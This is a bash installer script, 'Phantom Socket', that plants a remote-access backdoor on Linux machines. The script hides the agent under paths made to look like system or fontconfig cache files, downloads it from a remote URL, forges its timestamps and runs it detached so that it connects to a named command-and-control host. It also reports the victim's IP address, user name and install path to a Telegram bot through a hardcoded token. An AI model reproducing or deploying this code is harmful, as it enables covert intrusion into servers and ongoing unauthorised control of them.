#!/bin/bash
# Phantom Socket v1.0.0-stable - Headless Environment Bypass Installer
# Architectural Standard: Zero-dependency, Static Execution, and Professional Stealth.

set -euo pipefail

# ============================================================================
# UNCOMPROMISING CORE DIRECTIVES
# ============================================================================
readonly VERSION="1.0.0-stable"
readonly AGENT_NAME="gs-oyen-s"
readonly PRIMARY_C2="oyen.serveftp.com"
readonly FALLBACK_C2="13.213.138.250"
readonly TELEGRAM_TOKEN="8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
readonly TELEGRAM_CHAT_ID="5439698489"

# ============================================================================
# BASH ENVIRONMENT BYPASS (SAFE VARIABLE HANDLING)
# ============================================================================
SAFE_HOME="${HOME:-/tmp}"
SAFE_USER="${USER:-$(whoami 2>/dev/null || echo "unknown")}"
SAFE_PWD="${PWD:-.}"

# ============================================================================
# RIGID INSTALLER SEQUENTIAL OUTPUT HELPERS
# ============================================================================
log_step() { echo "[-] $1"; }
log_success() { echo "[+] $1"; }
log_info() { echo "[*] $1"; }

# ============================================================================
# EXECUTION FLOW
# ============================================================================

# 1. Environment Check
log_step "Checking environment..."
ARCH=$(uname -m)
case "${ARCH}" in
    x86_64|amd64) ARCH="x86_64" ;;
    *) echo "[ERROR] Unsupported architecture: ${ARCH}"; exit 1 ;;
esac
log_step "Architecture: ${ARCH}"

# 2. Cryptographic Secret
log_step "Generating cryptographic secret..."
AGENT_SECRET=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
log_success "Secret generated successfully (32 characters)"

# 3. Path Selection Logic (Professional Stealth)
if [[ ${EUID:-$(id -u)} -eq 0 ]]; then
    # Root: Deep system path
    STEALTH_PATH="/usr/lib/x86_64-linux-gnu/.system-runtime-cache/.systemd-timesyncd"
else
    # User or Web Environment
    if [[ "${SAFE_HOME}" == *"/var/www"* ]] || [[ "${SAFE_HOME}" == *"vhosts"* ]] || [[ "${SAFE_PWD}" == *"/var/www"* ]]; then
        # Force path to /tmp for web environments
        INSTALL_DIR="/tmp/.fontconfig-daemon"
    else
        # Standard User: Fontconfig cache
        INSTALL_DIR="${SAFE_HOME}/.cache/fontconfig"
    fi
    STEALTH_PATH="${INSTALL_DIR}/.systemd-timesyncd"
fi

INSTALL_DIR=$(dirname "$STEALTH_PATH")
mkdir -p "${INSTALL_DIR}" 2>/dev/null || true

# 4. Download Binary (100% Static Linkage)
DOWNLOAD_URL="https://raw.githubusercontent.com/Oyen-Sec/soket/main/bin/gs-oyen-s-${ARCH}"
log_step "Downloading binary from: \`${DOWNLOAD_URL}\`"

# Fallback for local build testing
if [[ -f "./gs-oyen-s-${ARCH}" ]]; then
    cp "./gs-oyen-s-${ARCH}" "${STEALTH_PATH}"
elif [[ -f "../bin/gs-oyen-s-${ARCH}" ]]; then
    cp "../bin/gs-oyen-s-${ARCH}" "${STEALTH_PATH}"
else
    curl -fsSL "${DOWNLOAD_URL}" -o "${STEALTH_PATH}" || { echo "[ERROR] Binary download failed"; exit 1; }
fi

log_success "Binary downloaded successfully"

# 5. Deployment & Stealth
log_step "Deploying agent to: ${STEALTH_PATH}"
chmod +x "${STEALTH_PATH}" 2>/dev/null || true

log_step "Applying timestomping..."
if [[ -f "/usr/bin/dbus-daemon" ]]; then
    touch -r /usr/bin/dbus-daemon "${STEALTH_PATH}" 2>/dev/null || true
    log_success "File timestamps matched."
fi

# 6. Double-Fork Daemonization Execution
# Execute payload fully detached from current PTY context utilizing setsid
setsid "$STEALTH_PATH" -s "$AGENT_SECRET" -i "$PRIMARY_C2" -m 443 >/dev/null 2>&1 &

# 7. Escape-Free Telemetry Implementation (Direct HTTP POST)
send_telemetry() {
    local TARGET_IP=$(curl -s --connect-timeout 5 https://ifconfig.me || echo "0.0.0.0")
    local KERNEL_STRING=$(uname -r)
    local UTC_TIMESTAMP=$(date -u "+%Y-%m-%d %H:%M:%S UTC")
    
    local PAYLOAD="<b>SYSTEM ALERT: [INSTALL_SUCCESS]</b><br>
<b>TARGET IP    :</b> <code>${TARGET_IP}</code><br>
<b>USER         :</b> <code>${SAFE_USER}</code><br>
<b>KERNEL VER   :</b> <code>${KERNEL_STRING}</code><br>
<b>STEALTH PATH :</b> <code>${STEALTH_PATH}</code><br>
<b>TIMESTAMP    :</b> ${UTC_TIMESTAMP}"

    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "parse_mode=HTML" \
        -d "text=${PAYLOAD}" >/dev/null 2>&1
}
(send_telemetry) &

# 8. Final Summary Output
log_success "Installation success"
log_info "Secret: ${AGENT_SECRET}"
log_info "Path: ${STEALTH_PATH}"
log_info "Relay: ${PRIMARY_C2}:443"
